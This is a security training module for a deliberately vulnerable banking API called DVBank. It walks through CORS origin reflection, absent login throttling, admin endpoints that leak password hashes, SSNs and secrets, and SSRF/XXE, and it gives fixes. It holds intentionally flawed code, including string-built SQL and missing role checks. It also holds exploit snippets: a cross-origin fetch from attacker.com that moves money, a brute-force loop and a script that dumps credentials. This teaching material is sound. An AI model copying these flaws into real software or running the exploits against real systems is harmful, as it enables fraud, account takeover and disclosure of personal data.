# Module 6: API Security

## Understanding API Security
DVBank exposes its functionality through a Flask JSON API. APIs concentrate authentication, authorization, and data handling in one place, so a single missing check can leak data or move money. This module walks through the real API flaws in DVBank: how to spot them, exploit them, and fix them.

The recurring themes below are:
- **Authorization** — endpoints authenticate a token but never check `role`, so any user reaches "admin" routes.
- **Data exposure** — responses serialize sensitive fields (`password_hash`, SSN/DOB, API keys) that should never leave the server.
- **Resource abuse** — no rate limiting or lockout on authentication.
- **Cross-origin trust** — CORS headers reflect any origin with credentials enabled.

## DVBank API Vulnerabilities

### 1. CORS Misconfiguration
**Location**: `backend/app.py:49-58`

There is no `flask_cors` instance. CORS is hand-rolled in an `after_request` hook that **reflects the request's `Origin`** back into `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true` for *any* origin:

```python
@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin:
        response.headers.add('Access-Control-Allow-Origin', origin)   # reflects ANY origin
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
        response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
        response.headers.add('Access-Control-Allow-Credentials', 'true')
    return response
```

**Why this is worse than `*`**: the CORS spec forbids the literal wildcard `*` together with credentials — browsers reject it. By *reflecting* the caller's origin instead, the server effectively grants every origin a credentialed allowance, defeating the protection the wildcard rule was meant to enforce.

**Impact**: a malicious page can issue credentialed cross-origin requests and **read the responses**. Note the scope precisely: this enables *cross-origin reading of credentialed responses*. It does not let an attacker drive Bearer-authed endpoints (e.g. `/api/transfer`, which is `@token_required` and needs an `Authorization` header the attacker's page can't supply for the victim).

**Exploitation** — pair it with a cookie-authenticated endpoint. `/api/quickpay` (`backend/routes/transaction_routes.py:122`) uses `@cookie_auth`, so the browser attaches the victim's `session_token` cookie automatically:

```javascript
// On attacker.com, victim is logged into DVBank in another tab
fetch('https://dvbank.com/api/quickpay', {
    method: 'POST',
    credentials: 'include',          // sends the victim's session_token cookie
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'to_user_id=2&amount=1000'
})
.then(r => r.json())
.then(console.log)                   // CORS reflection lets attacker READ the result
```

The money movement here is really **CSRF / credential replay**: the cookie is sent because it lacks `SameSite`, not because of the CORS headers. The CORS reflection's added power is letting the attacker's JavaScript *read* the credentialed JSON response. See `docs/exploits/csrf_transfer.html`.

> CSRF root cause is the cookie design, not these headers — covered in Prevention below.

### 2. Missing Rate Limiting
**Location**: `backend/routes/auth_routes.py:30-86`

The login handler does a raw SQL lookup and `check_password`, and records every attempt in the `LoginAttempt` table — but never enforces a lockout, throttle, delay, or CAPTCHA (CWE-307):

```python
@auth_bp.route('/api/login', methods=['POST'])
def login():
    username = data.get('username')
    password = data.get('password')

    query = f"SELECT * FROM user WHERE username = '{username}'"
    user = db.session.execute(query).fetchone()

    if user and User.query.get(user[0]).check_password(password):
        ...
        login_attempt = LoginAttempt(username=username, ip_address=request.remote_addr,
                                     created_at=datetime.utcnow(), success=True)   # recorded
        db.session.add(login_attempt); db.session.commit()
        ...
    login_attempt = LoginAttempt(username=username, ip_address=request.remote_addr,
                                 created_at=datetime.utcnow(), success=False)      # recorded
    db.session.add(login_attempt); db.session.commit()
    return jsonify({'error': 'Invalid username or password'}), 401
```

**Teaching point**: the failures are *logged but never acted on*. Nothing reads `LoginAttempt` to count failures and block the account or IP, so an attacker gets unlimited guesses. Combined with fast, unsalted MD5 hashing (`models.py`), online brute force / password spraying is fully viable.

**Impact**:
- Brute force / credential stuffing against any account
- DoS through unbounded authentication work

**Exploitation**: see `docs/exploits/brute_force.py`.

```python
import requests
for password in passwords:
    r = requests.post('http://localhost:5000/api/login',
                      json={'username': 'alice', 'password': password})
    if r.status_code == 200:
        print(f"Found password: {password}")
        break
```

> Target a **seeded** user. Only `alice`, `bob`, `charlie`, `dave`, `eve`, `frank` exist (`app.py` `init_db`) — there is **no `admin` account**, so a PoC aimed at `admin` will never succeed.

> The generic `401` ("Invalid username or password") is identical for unknown users and wrong passwords, so `/api/login` does **not** leak which usernames exist. For account enumeration, see `/api/register`, which returns `"Username already exists"` for taken names (`auth_routes.py:18-19`).

### 3. Excessive Data Exposure
**Location**: `backend/routes/admin_routes.py:280-292`

The clearest sink is `GET /api/admin/users`. It is `@token_required` (any valid token) with **no role check**, and it manually serializes fields that `User.to_dict()` deliberately omits — leaking the MD5 `password_hash` and the full profile (including SSN/DOB) of every user to any authenticated caller:

```python
@admin_bp.route('/api/admin/users', methods=['GET'])
@token_required                                 # any token works - no role gate
def list_all_users(current_user):
    users = User.query.all()
    return jsonify([{
        'id': u.id, 'username': u.username, 'email': u.email,
        'balance': float(u.balance), 'role': u.role,
        'password_hash': u.password_hash,        # leaks the password hash
        'profile': u.get_profile()               # leaks full profile incl. ssn / dob
    } for u in users])
```

`User.to_dict()` (`models.py:38-47`) returns only `id`, `username`, `email`, `balance`, `role`, `created_at`, `last_login` — no `password_hash`, no SSN. The vulnerability is that this endpoint **bypasses** that safe serializer and hand-builds a response with the sensitive fields.

Two more over-exposure sinks follow the same pattern:
- **`GET /api/admin/dashboard-data`** (`admin_routes.py:448-461`) — returns the hardcoded `ADMIN_API_KEY` and `AWS_ACCESS_KEY` in the JSON body.
- **`GET /api/me`** (`auth_routes.py:95-103`) — returns `current_user.get_profile()`, so a user's own SSN/DOB are echoed back even though the UI never needs them.

**Exploitation** — any logged-in user (e.g. `alice`) can dump everyone's secrets:

```python
import requests
token = login_as('alice')   # ordinary, non-admin user
r = requests.get('http://localhost:5000/api/admin/users',
                 headers={'Authorization': f'Bearer {token}'})
for u in r.json():
    print(u['username'], u['password_hash'], u['profile'].get('ssn'))
```

**Impact**: PII (SSN/DOB) disclosure, offline cracking of leaked MD5 hashes, and exposure of cloud/API credentials — all without admin privileges.

### 4. Infrastructure: SSRF & XXE
Two admin endpoints reach out to attacker-controlled resources. Both are `@token_required` only — again no role check.

- **SSRF (CWE-918)** — `admin_routes.py:99-124`. `/api/admin/webhook-test` and `/api/admin/fetch-avatar` fetch a URL taken straight from the request body, letting an attacker pivot to internal services or cloud metadata (`http://169.254.169.254/...`). `fetch-avatar` even sets `verify=False`.
- **XXE (CWE-611)** — `admin_routes.py:155-172`. `/api/admin/import-data` parses request XML with `etree.XMLParser(resolve_entities=True, no_network=False)`, so external entities resolve — enabling local file reads and SSRF via crafted XML.

## Prevention Methods

### 1. CORS — allowlist, never reflect
Fix the real `after_request` hook: compare `Origin` against an explicit allowlist and only then echo it. Never reflect arbitrary origins with credentials enabled.

```python
ALLOWED_ORIGINS = {'https://dvbank.com'}

@app.after_request
def after_request(response):
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:                 # exact match only
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Vary'] = 'Origin'       # don't let caches cross origins
    return response
```

CSRF is a *separate* fix from CORS: the cross-site money movement is possible because `cookie_auth` (`auth.py:60-88`) trusts an ambient `session_token` cookie set without `SameSite`/`HttpOnly`/`Secure` (`auth_routes.py:74`) and requires no anti-CSRF token. Harden the cookie design — set `SameSite=Strict`, `HttpOnly`, `Secure`, and require a CSRF token on state-changing requests.

### 2. Rate Limiting
Use a single, self-contained throttle. `flask_limiter` enforces the limit for you — no hand-rolled counters needed:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(get_remote_address, app=app,
                  default_limits=["200 per day", "50 per hour"])

@auth_bp.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")        # returns 429 once exceeded
def login():
    ...
```

For account-level protection, also count failures from `LoginAttempt` and lock the account (with backoff) after a threshold.

### 3. Data Filtering
Serialize through one trusted method and gate sensitive data on role. `User.to_dict()` already excludes `password_hash` and the SSN-bearing profile — use it, and never hand-build responses with extra fields:

```python
# models.py - the safe serializer (no password_hash, no ssn/dob):
def to_dict(self):
    return {
        'id': self.id, 'username': self.username, 'email': self.email,
        'balance': float(self.balance), 'role': self.role,
        'created_at': self.created_at.isoformat(),
        'last_login': self.last_login.isoformat() if self.last_login else None,
    }

@admin_bp.route('/api/admin/users', methods=['GET'])
@token_required
def list_all_users(current_user):
    if current_user.role != 'admin':                 # enforce the role gate
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify([u.to_dict() for u in User.query.all()])
```

Apply the same role check to `/api/admin/dashboard-data`, and stop echoing secrets (`ADMIN_API_KEY`, `AWS_ACCESS_KEY`) in any response — load them from the environment and keep them server-side.

## Practice Exercises
1. **CORS** — confirm the reflected `Access-Control-Allow-Origin` with a crafted `Origin` header, then replace the hook with an allowlist.
2. **Rate Limiting** — run `docs/exploits/brute_force.py` against `alice`; then add `@limiter.limit` and verify a `429`.
3. **Data Exposure** — call `/api/admin/users` as a non-admin and recover hashes + SSNs; add the role gate and reserialize via `to_dict()`.
4. **SSRF/XXE** — point `/api/admin/fetch-avatar` at an internal address and craft an XXE payload for `/api/admin/import-data`.

## Additional Resources
1. [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
2. [REST Security Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
3. [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
4. [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html) · [CWE-611: XXE](https://cwe.mitre.org/data/definitions/611.html)

### Related Tools
1. [Postman](https://www.postman.com/) - API testing and security assessment
2. [OWASP ZAP](https://www.zaproxy.org/) - API security testing
3. [Burp Suite](https://portswigger.net/burp) - Web API security testing

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments.
